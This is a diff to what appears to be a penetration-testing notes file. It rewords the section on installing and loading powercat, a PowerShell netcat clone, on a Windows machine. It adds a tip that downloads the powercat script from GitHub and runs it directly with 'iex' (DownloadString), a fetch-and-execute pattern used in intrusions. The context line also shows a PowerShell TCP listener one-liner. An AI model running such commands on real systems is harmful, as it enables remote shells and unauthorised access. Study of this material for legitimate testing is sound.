@@ -189,4 +189,8 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',
 
 ### `powercat`
 Powershell version of netcat.
-Install in Kali: `apt install powercat`. This is going to place the script `powercat.ps1` at `/usr/share/windows-resources/powercat`. Copy the script to the Windows machine, and then run it from powershell in this way: `. .\powercat.ps1`. This makes variables and functions defined in the script accessible to the PS console. From here the command `powercat` is available.
+Install in Kali: `apt install powercat`.
+
+The installation process places the script `powercat.ps1` at `/usr/share/windows-resources/powercat`. Copy the script to the Windows machine, and then run it from powershell in this way: `. .\powercat.ps1`. This makes variables and functions defined in the script accessible to the PS console. From here the command `powercat` is available.
+
+Tip: It is also possible to download the powercat script and run it using`iex`: ```iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```
